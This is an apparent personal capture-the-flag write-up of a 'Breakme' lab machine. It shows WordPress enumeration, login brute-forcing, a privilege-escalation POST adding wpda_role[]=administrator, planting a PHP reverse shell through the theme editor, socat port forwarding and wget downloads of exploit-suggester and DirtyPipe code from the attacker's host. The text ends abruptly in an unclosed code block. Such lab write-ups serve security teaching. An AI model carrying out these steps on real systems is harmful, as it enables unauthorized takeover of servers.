
# Breakme 


![[618b3fa52f0acc0061fb0172-1718377873024 1.png]]

Break this secure system and get the flags, if you can.



Given this challenge said it was a secure system, I ran nmap on all ports but mainly used nikto if it was a webserver. 
## Nikto


+ Server: Apache/2.4.56 (Debian)
+ Server leaks inodes via ETags, header found with file /, fields: 0x29cd 0x5c9c7e2a02b15 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET 
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ Uncommon header 'link' found, with contents: <http://ip-10-10-72-131.eu-west-1.compute.internal/wordpress/index.php/wp-json/>; rel="https://api.w.org/"
+ /wordpress/: A Wordpress installation was found.
+ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2024-09-20 21:16:35 (GMT1) (19 seconds)

This turned to be very helpful as nikto pointed out I could access a wordpress web application. 

```
/wordpress/
```

Below are some links I went through just to show I meant hours on this room.
### Links

```
Wordpress 6.4.3: https://github.com/AkuCyberSec/Elementor-3.18.0-Upload-Path-Traversal-RCE-CVE-2023-48777/blob/main/exploit.py

https://github.com/advisories/GHSA-9m7w-p6hr-xv2x

https://packetstormsecurity.com/files/177227/WordPress-6.4.3-Username-Disclosure.html

wordpress 6.4.3 exploit github

PHP Deserialization Wordpress: https://sploitus.com/exploit?id=49D576AC-2683-57C3-975A-510DFEBC97AE

All exploits: https://github.com/Hacker5preme/Exploits

```

We can access the web page via /wordpress/ on the IP. 


![[Pasted image 20240920164322.png]]

We also found the wp-admin login page, running wp-scan I found these two usernames: 

```
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] XXXXX
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.72.131/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
[+] XXXXX
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```


Brute forcing the login page via python (or hydra), I was able to obtain the credentials to use  to then login via XXXX.


I ran wp-scan which led me to finding this vulnerability on packet security following collaborative research into vulnerabilities. 

Packet Security: https://packetstormsecurity.com/files/171825/WordPress-WP-Data-Access-5.3.7-Privilege-Escalation.html

```
Description: WP Data Access <= 5.3.7 – Authenticated (Subscriber+) Privilege Escalation 
Affected Plugin: WP Data AccessPlugin Slug: wp-data-accessAffected Versions: <= 5.3.7CVE ID: CVE-2023-1874CVSS 
Score: 7.5 (High)CVSS Vector:  CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:HResearcher/s: Chloe Chamberland Fully Patched Version: 5.3.8


The WP Data Access plugin for WordPress is vulnerable to privilege escalation in versions up to, and including, 5.3.7. This is due to a lack of authorization checks on the multiple_roles_update function. This makes it possible for authenticated attackers, with minimal permissions such as a subscriber, to modify their user role by supplying the ‘wpda_role[]‘ parameter during a profile update. This requires the ‘Enable role management’ setting to be enabled for the site.
```


In the request I captured, all I needed to do was append the `wpda_role[]=administrator` parameter to the POST data where the other form fields (like `first_name`, `last_name`, etc.) are being submitted. 
### Original POST Data:
```plaintext
_wpnonce=ddd142855f&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fprofile.php&from=profile&checkuser_id=2&color-nonce=bc3e321271&admin_color=fresh&admin_bar_front=1&first_name=bob&last_name=bob&nickname=bob&display_name=bob+bob&email=bob%40localhost.com&url=&description=hiiii&pass1=&pass2=&action=update&user_id=2&submit=Update+Profile
```

### Modified POST Data (with `wpda_role[]=administrator`):
```plaintext
_wpnonce=ddd142855f&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fprofile.php&from=profile&checkuser_id=2&color-nonce=bc3e321271&admin_color=fresh&admin_bar_front=1&first_name=bob&last_name=bob&nickname=bob&display_name=bob+bob&email=bob%40localhost.com&url=&description=hiiii&pass1=&pass2=&action=update&user_id=2&submit=Update+Profile&wpda_role[]=administrator
```

### Key Details:
- **`wpda_role[]=administrator`**: This parameter will attempt to elevate the user’s role to `administrator`.
- The rest of the POST data remains unchanged.

We got admin access!

![[Pasted image 20240920173920.png]]



## Reverse Shell

```python
Tools --> Theme File Editor -> Patterns --> modify a file with a reverse shell 
```

Reverse PHP Shell: https://github.com/pentestmonkey/php-reverse-shell

I modified a specific file and then navigated to the file after had created my listener. 


We got shell! 


![[Pasted image 20240920182006.png]]


Upgrading shell: 

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'; stty raw -echo; fg; reset; export SHELL=/bin/bash; export TERM=xterm-256color


# Fixes it 
stty rows 40 columns 100

```


Now that I've stabilized shell. It was time to investigate.  

![[Pasted image 20240920182454.png]]


Given we cannot use sudo -l for SUID permission to look for weaknesses via GTFO bins. I chose an alternative instead (https://delinea.com/blog/linux-privilege-escalation). This provided an alternative to finding SUIDs I could later investigate for misconfigurations. 


|                                                                                 |                                             |
| ------------------------------------------------------------------------------- | ------------------------------------------- |
| **Enumeration Commands**                                                        | **Description**                             |
| id                                                                              | print real and effective user and group IDs |
| whoami                                                                          | current user                                |
| hostname                                                                        | show or set the system's host name          |
| uname                                                                           | print system information                    |
| ps -ef                                                                          | report a snapshot of the current processes  |
| echo $PATH                                                                      | print environment PATH variable             |
| ifconfig                                                                        | configure a network interface               |
| cat /etc/passwd                                                                 | show passwd file contents                   |
| sudo -l                                                                         | list commands allowed using sudo            |
| find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null | Find all files suid and sgid files          |

There, I used the last command to do the same thing that sudo -l does but without permissions such as 'sudo'


```bash
www-data@Breakme:/$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
<u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwsr-xr-x 1 root root 481608 Jul  1  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwxr-sr-x 1 root shadow 38912 Jul  9  2021 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root tty 35048 Jul 28  2021 /usr/bin/wall
-rwsr-xr-x 1 root root 34896 Feb 26  2021 /usr/bin/fusermount
-rwsr-xr-x 1 root root 182600 Jan 14  2023 /usr/bin/sudo
-rwxr-sr-x 1 root crontab 43568 Feb 22  2021 /usr/bin/crontab
-rwsr-xr-x 1 root root 71912 Jul 28  2021 /usr/bin/su
-rwxr-sr-x 1 root shadow 31160 Feb  7  2020 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 354440 Jul  1  2022 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 44632 Feb  7  2020 /usr/bin/newgrp
-rwsr-xr-x 1 root root 55528 Jul 28  2021 /usr/bin/mount
-rwxr-sr-x 1 root mail 23040 Feb  4  2021 /usr/bin/dotlockfile
-rwsr-xr-x 1 root root 52880 Feb  7  2020 /usr/bin/chsh
-rwxr-sr-x 1 root shadow 80256 Feb  7  2020 /usr/bin/chage
-rwsr-xr-x 1 root root 88304 Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd
-rwsr-xr-x 1 root root 35040 Jul 28  2021 /usr/bin/umount
-rwsr-xr-x 1 root root 58416 Feb  7  2020 /usr/bin/chfn
```

From there, we notice all of those with SUID permissions. I made sure to note this down before continuing to see if there are any other users I should be aware of via cat /etc/passwd

```bash
www-data@Breakme:/$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:114:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ftp:x:107:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
mysql:x:108:116:MySQL Server,,,:/nonexistent:/bin/false
john:x:1002:1002:john wick,14,14,14:/home/john:/bin/bash
youcef:x:1000:1000:youcef,17,17,17:/home/youcef:/bin/bash
```


What gained my interest was /usr/bin/passwd. I saved it in my history. 


## Network Enumeration

I ran netstat to see if there were any other sources besides what we know given the folder for one the users pointed at intranet which is private internal network. 

`netstat -tulp`


```bash
www-data@Breakme:/home/john$ netstat -tulnp
netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   

```


On the target shell I did nc 127.0.0.1 9999 to test to see if it is a live webserver or not at all. 

![[Pasted image 20240920194901.png]]

I made a request to the site running on this port: 

```bash
GET / HTTP/1.1
Host: 127.0.0.1
```

Pressed Enter. 


```http


www-data@Breakme:/home/john$ nc 127.0.0.1 9999
nc 127.0.0.1 9999
GET / HTTP/1.1
GET / HTTP/1.1
Host: localhost
Host: localhost


HTTP/1.1 200 OK
Host: localhost
Date: Fri, 20 Sep 2024 23:51:14 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Set-Cookie: PHPSESSID=tepqe668ambbu9dh0lrohk72kv; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-type: text/html; charset=UTF-8

<html>
<head>
        <title>Test</title>
        <style>
                .checkTarget{
                        position:absolute;
                        width:calc(30%);
                        height:450px;
                        top:calc(10%);
                        left:calc(2.5%);
                        border:3px solid green;
                        border-radius:5%;
                        background-color:rgb(180,220,180);
                        text-align:center;
                }
                .checkUser{
                        position:absolute;
                        width:calc(30%);
                        height:450px;
                        top:calc(10%);
                        left:calc(35%);
                        border:3px solid green;
                        border-radius:5%;
                        background-color:rgb(180,220,180);
                        text-align:center;
                }
                .checkFile{
                        position:absolute;
                        width:calc(30%);
                        height:450px;
                        top:calc(10%);
                        left:calc(67.5%);
                        border:3px solid green;
                        border-radius:5%;
                        background-color:rgb(180,220,180);
                        text-align:center;
                }
                body{
                        background-color:rgb(200,200,200);
                }
                pre{
                        white-space:pre-wrap;
                        word-wrap:break-word;
                        overflow:auto;
                        width:calc(100%);
                        height:180px;
                        text-align:center;
                }
                .output{
                        width:calc(100%);
                        text-align:center;
                }
        </style>
</head>
<body>
        



        <h1 style="color:rgb(50,100,50);">My Tools:</h1>
        <!--Only numerical IPs allowed -->
        <div class="container">
        <form class="checkTarget" method="POST">
                <h3>Check Target:</h3>
                <input name="cmd1" style="border-radius:5%;border:3px solid green;height:30px" type="text" placeholder="Target IP" /><br><br>
                <input style="width:70px" type="submit" value="Run" /><br><br><br>
                <h3>Result:</h3><br>
                <div class="output"><pre></pre></div>
        </form>
        <form class="checkUser" method="POST">
                <h3>Check User:</h3>
                <input name="cmd2" style="border-radius:5%;border:3px solid green;height:30px" type="text" placeholder="User name" /><br><br>
                <input style="width:70px" type="submit" value="Run" /><br><br><br>
                <h3>Result:</h3><br>
                <div class="output"><pre></pre></div>
        </form>
        <form class="checkFile" method="POST">
                <h3>Check File:</h3>
                <input name="cmd3" style="border-radius:5%;border:3px solid green;height:30px" type="text" placeholder="File name" /><br><br>
                <input style="width:70px" type="submit" value="Run" /><br><br><br>
                <h3>Result:</h3>
                <div class="output"><pre></pre></div>
        </form>
        </div>
</body>
</html>

```

Pressed Enter again until I left the session.


## Port Forwarding 

I know now that I needed to port forward to access this web page so after playing around, I finally found that socat worked perfectly. 

Knowing that the webserver is running on 127.0.0.1:9999, we created our *socat* command as shown below. 

```bash
www-data@Breakme:/home/john$ netstat -tulnp
netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN      -  
```


**On the target machine**, set up the forwarding like this:
   
   ```bash
   socat TCP-LISTEN:5555,fork TCP:127.0.0.1:9999
   ```

This listens on port **5555** and forwards traffic to port **9999**.

 **On your local machine**, you can now connect to the target machine’s port **5555** to access the service. Run this on your local machine:

   ```bash
   socat TCP-LISTEN:9999,fork TCP:10.10.72.131:5555
   ```
 **Access the webpage** on your local machine by visiting:

   ```
   http://localhost:9999
   ```

---



![[Pasted image 20240920200103.png]]

Didn't feel like doing this so I moved on knowing that if a human made it, there is a flaw. It was really extensive and I felt too lazy to go through the pain of blind command injection.

Remember the /etc/passwd from ealier?: 


```bash
www-data@Breakme:/$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
mysql:x:108:116:MySQL Server,,,:/nonexistent:/bin/false
john:x:1002:1002:john wick,14,14,14:/home/john:/bin/bash
youcef:x:1000:1000:youcef,17,17,17:/home/youcef:/bin/bash
```


I went to go see what processes were running root in case I saw a cron job.

ps aux | grep root 


```bash
ps aux | grep root
root           1  0.0  0.4  98316  9928 ?        Ss   16:10   0:00 /sbin/init
root           2  0.0  0.0      0     0 ?        S    16:10   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   16:10   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   16:10   0:00 [rcu_par_gp]
root           6  0.0  0.0      0     0 ?        I<   16:10   0:00 [kworker/0:0H-events_highpri]
root           7  0.0  0.0      0     0 ?        I    16:10   0:00 [kworker/0:1-events]
root           9  0.0  0.0      0     0 ?        I<   16:10   0:00 [mm_percpu_wq]
root          10  0.0  0.0      0     0 ?        S    16:10   0:00 [rcu_tasks_rude_]
root          11  0.0  0.0      0     0 ?        S    16:10   0:00 [rcu_tasks_trace]
root          12  0.0  0.0      0     0 ?        S    16:10   0:00 [ksoftirqd/0]
root          13  0.0  0.0      0     0 ?        I    16:10   0:00 [rcu_sched]
root          14  0.0  0.0      0     0 ?        S    16:10   0:00 [migration/0]
root          15  0.0  0.0      0     0 ?        S    16:10   0:00 [cpuhp/0]
root          17  0.0  0.0      0     0 ?        S    16:10   0:00 [kdevtmpfs]
root          18  0.0  0.0      0     0 ?        I<   16:10   0:00 [netns]
root          19  0.0  0.0      0     0 ?        S    16:10   0:00 [kauditd]
root          20  0.0  0.0      0     0 ?        S    16:10   0:00 [khungtaskd]
root          21  0.0  0.0      0     0 ?        S    16:10   0:00 [oom_reaper]
root          22  0.0  0.0      0     0 ?        I<   16:10   0:00 [writeback]
root          23  0.0  0.0      0     0 ?        S    16:10   0:00 [kcompactd0]
root          24  0.0  0.0      0     0 ?        SN   16:10   0:00 [ksmd]
root          25  0.0  0.0      0     0 ?        SN   16:10   0:00 [khugepaged]
root          43  0.0  0.0      0     0 ?        I<   16:10   0:00 [kintegrityd]
root          44  0.0  0.0      0     0 ?        I<   16:10   0:00 [kblockd]
root          45  0.0  0.0      0     0 ?        I<   16:10   0:00 [blkcg_punt_bio]
root          46  0.0  0.0      0     0 ?        I<   16:10   0:00 [edac-poller]
root          47  0.0  0.0      0     0 ?        I<   16:10   0:00 [devfreq_wq]
root          48  0.0  0.0      0     0 ?        I<   16:10   0:00 [kworker/0:1H-kblockd]
root          49  0.0  0.0      0     0 ?        S    16:10   0:00 [kswapd0]
root          50  0.0  0.0      0     0 ?        I<   16:10   0:00 [kthrotld]
root          51  0.0  0.0      0     0 ?        I<   16:10   0:00 [acpi_thermal_pm]
root          52  0.0  0.0      0     0 ?        S    16:10   0:00 [xenbus]
root          53  0.0  0.0      0     0 ?        S    16:10   0:00 [xenwatch]
root          54  0.0  0.0      0     0 ?        I<   16:10   0:00 [ipv6_addrconf]
root          65  0.0  0.0      0     0 ?        I<   16:10   0:00 [kstrp]
root          68  0.0  0.0      0     0 ?        I<   16:10   0:00 [zswap-shrink]
root          69  0.0  0.0      0     0 ?        I<   16:10   0:00 [kworker/u31:0]
root         111  0.0  0.0      0     0 ?        I<   16:10   0:00 [ata_sff]
root         112  0.0  0.0      0     0 ?        S    16:10   0:00 [scsi_eh_0]
root         113  0.0  0.0      0     0 ?        I<   16:10   0:00 [scsi_tmf_0]
root         114  0.0  0.0      0     0 ?        S    16:10   0:00 [scsi_eh_1]
root         115  0.0  0.0      0     0 ?        I<   16:10   0:00 [scsi_tmf_1]
root         145  0.0  0.0      0     0 ?        S    16:10   0:00 [jbd2/xvda1-8]
root         146  0.0  0.0      0     0 ?        I<   16:10   0:00 [ext4-rsv-conver]
root         180  0.0  0.7  64756 14892 ?        Ss   16:10   0:00 /lib/systemd/systemd-journald
root         207  0.0  0.3  22532  6192 ?        Ss   16:10   0:00 /lib/systemd/systemd-udevd
root         226  0.0  0.0      0     0 ?        I<   16:10   0:00 [cryptd]
root         295  0.0  0.0      0     0 ?        S    16:10   0:00 [jbd2/xvda4-8]
root         296  0.0  0.0      0     0 ?        I<   16:10   0:00 [ext4-rsv-conver]
root         360  0.0  0.0      0     0 ?        S    16:10   0:00 [jbd2/xvda2-8]
root         361  0.0  0.0      0     0 ?        I<   16:10   0:00 [ext4-rsv-conver]
root         381  0.0  0.1   6744  2744 ?        Ss   16:10   0:00 /usr/sbin/cron -f
root         384  0.0  0.2 220796  4080 ?        Ssl  16:10   0:00 /usr/sbin/rsyslogd -n -iNONE
root         385  0.0  0.2  13396  5576 ?        Ss   16:10   0:00 /lib/systemd/systemd-logind
root         386  0.0  0.2  14616  5188 ?        Ss   16:10   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
root         501  0.0  0.2  99884  5640 ?        Ssl  16:10   0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root         577  0.0  0.0   5844  1676 tty1     Ss+  16:10   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root         578  0.0  0.1   5476  2124 ttyS0    Ss+  16:10   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,57600,38400,9600 ttyS0 vt220
root         652  0.0  0.3  13352  7564 ?        Ss   16:10   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         653  0.0  1.0 194456 20276 ?        Ss   16:10   0:00 /usr/sbin/apache2 -k start
root         729  0.0  1.0 1684096 21584 ?       Ssl  16:12   0:00 /usr/bin/amazon-ssm-agent
root         833  0.0  0.0      0     0 ?        I    16:17   0:02 [kworker/0:3-events]
root        1158  0.0  0.0      0     0 ?        I    17:26   0:00 [kworker/u30:3-events_unbound]
root        1356  0.0  0.0      0     0 ?        I    18:12   0:00 [kworker/u30:0-ext4-rsv-conversion]
root        1367  0.0  0.0      0     0 ?        I    18:17   0:00 [kworker/u30:1-flush-202:0]
root        1395  0.0  0.0      0     0 ?        I    18:21   0:00 [kworker/u30:2-flush-202:0]
www-data    1409  0.0  0.0   6580   636 pts/0    S+   18:25   0:00 grep root
```

We know that these are the processes running root. 

We know that John has the user1.txt 

```bash
www-data@Breakme:/home$ ls -la
ls -la
total 32
drwxr-xr-x  5 root   root  4096 Feb  3  2024 .
drwxr-xr-x 18 root   root  4096 Aug 17  2021 ..
drwxr-xr-x  4 john   john  4096 Aug  3  2023 john
drwx------  2 root   root 16384 Aug 17  2021 lost+found
drwxr-x---  4 youcef john  4096 Aug  3  2023 youcef
www-data@Breakme:/home$ cd john
cd john
www-data@Breakme:/home/john$ ls
ls
internal  user1.txt
www-data@Breakme:/home/john$ cat user1.txt
cat user1.txt
cat: user1.txt: Permission denied
www-data@Breakme:/home/john$ 
```

Reading permissions  within the user john, I knew I had to find an alternative. 

```bash
www-data@Breakme:/home/john$ ls -la
ls -la
total 32
drwxr-xr-x 4 john john 4096 Aug  3  2023 .
drwxr-xr-x 5 root root 4096 Feb  3  2024 ..
lrwxrwxrwx 1 john john    9 Aug  3  2023 .bash_history -> /dev/null
-rw-r--r-- 1 john john  220 Jul 31  2023 .bash_logout
-rw-r--r-- 1 john john 3526 Jul 31  2023 .bashrc
drwxr-xr-x 3 john john 4096 Jul 31  2023 .local
-rw-r--r-- 1 john john  807 Jul 31  2023 .profile
drwx------ 2 john john 4096 Feb  4  2024 internal
-rw------- 1 john john   33 Aug  3  2023 user1.txt
www-data@Breakme:/home/john$ cat .bash_history
cat .bash_history
www-data@Breakme:/home/john$ cd internal
cd internal
bash: cd: internal: Permission denied
www-data@Breakme:/home/john$ ls
ls
internal  user1.txt  
```

After a long time enumerating, I decided to try out Linux Suggester instead of the others given that weren't as helpful and I'm old school. 

I started a python webserver in a separate tab: 

```python

python3 -m http.server 8000

```

Then on my local machine, I installed Linux Exploit Suggester via wget. 

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```

On my stabilized shell, I ran wget to my local machine to retrieve linux exploit suggester and make it available on my target's shell.

```bash
wget http://10.10.146.120:8000/les.sh -O /tmp/les.sh
chmod +x /tmp/les.sh
/tmp/les.sh
```


## Privilege Escalation 


Installed Linux Suggester

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
--2024-09-21 15:14:45--  https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 90858 (89K) [text/plain]
Saving to: \u2018les.sh\u2019

les.sh              100%[===================>]  88.73K  --.-KB/s    in 0.001s  

2024-09-21 15:14:45 (66.3 MB/s) - \u2018les.sh\u2019 saved [90858/90858]

```


Transferred it over python -m http.server 8000

```bash
root@ip-10-10-146-120:~# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.232.120 - - [21/Sep/2024 15:13:45] code 404, message File not found
10.10.232.120 - - [21/Sep/2024 15:13:45] "GET /linux-exploit-suggester.sh HTTP/1.1" 404 -
10.10.232.120 - - [21/Sep/2024 15:15:16] code 404, message File not found
10.10.232.120 - - [21/Sep/2024 15:15:16] "GET /linux-exploit-suggester.sh HTTP/1.1" 404 -
10.10.232.120 - - [21/Sep/2024 15:16:13] "GET /les.sh HTTP/1.1" 200 -
10.10.232.120 - - [21/Sep/2024 15:27:34] "GET /exploit-2.c HTTP/1.1" 200 -
10.10.232.120 - - [21/Sep/2024 15:29:08] "GET /dirtypipe HTTP/1.1" 200 -

```


Then i ran linux suggester to figure out what CVEs to use: 

```bash
www-data@Breakme:/home/john$ wget http://10.10.146.120:8000/les.sh -O /tmp/les.sh
<get http://10.10.146.120:8000/les.sh -O /tmp/les.sh
--2024-09-21 10:16:14--  http://10.10.146.120:8000/les.sh
Connecting to 10.10.146.120:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 90858 (89K) [text/x-sh]
Saving to: \u2018/tmp/les.sh\u2019

/tmp/les.sh         100%[===================>]  88.73K  --.-KB/s    in 0.001s  

2024-09-21 10:16:14 (172 MB/s) - \u2018/tmp/les.sh\u2019 saved [90858/90858]

www-data@Breakme:/home/john$ chmod +x /tmp/les.sh
chmod +x /tmp/les.sh
```

Found out that dirtypipe is possible: 

```bash
www-data@Breakme:/home/john$ /tmp/les.sh
/tmp/les.sh

Available information:

Kernel version: 5.10.0
Architecture: x86_64
Distribution: debian
Distribution version: 11
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

81 kernel space exploits
49 user space exploits

Possible Exploits:

cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops

   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
   Exposure: probable
   Tags: ubuntu=20.04{kernel:5.8.0-(25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52)-*},ubuntu=21.04{kernel:5.11.0-16-*}
   Download URL: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: ubuntu=(20.04|21.04),[ debian=11 ]
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

www-data@Breakme:/home/john$ wget http://10.10.146.120:8000/exploit-2.c -O /tmp/exploit-2.c
</10.10.146.120:8000/exploit-2.c -O /tmp/exploit-2.c
--2024-09-21 10:27:34--  http://10.10.146.120:8000/exploit-2.c
Connecting to 10.10.146.120:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7752 (7.6K) [text/plain]
Saving to: \u2018/tmp/exploit-2.c\u2019

/tmp/exploit-2.c    100%[===================>]   7.57K  --.-KB/s    in 0s      

2024-09-21 10:27:34 (170 MB/s) - \u2018/tmp/exploit-2.c\u2019 saved [7752/7752]

www-data@Breakme:/home/john$ gcc /tmp/exploit-2.c -o /tmp/dirtypipez
gcc /tmp/exploit-2.c -o /tmp/dirtypipez
bash: gcc: command not found
www-data@Breakme:/home/john$ gcc /tmp/exploit-2.c -o /tmp/dirtypipe
gcc /tmp/exploit-2.c -o /tmp/dirtypipe
bash: gcc: command not found

```

Given we know that DirtyPipe is possible

```bash
[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: ubuntu=(20.04|21.04),[ debian=11 ]
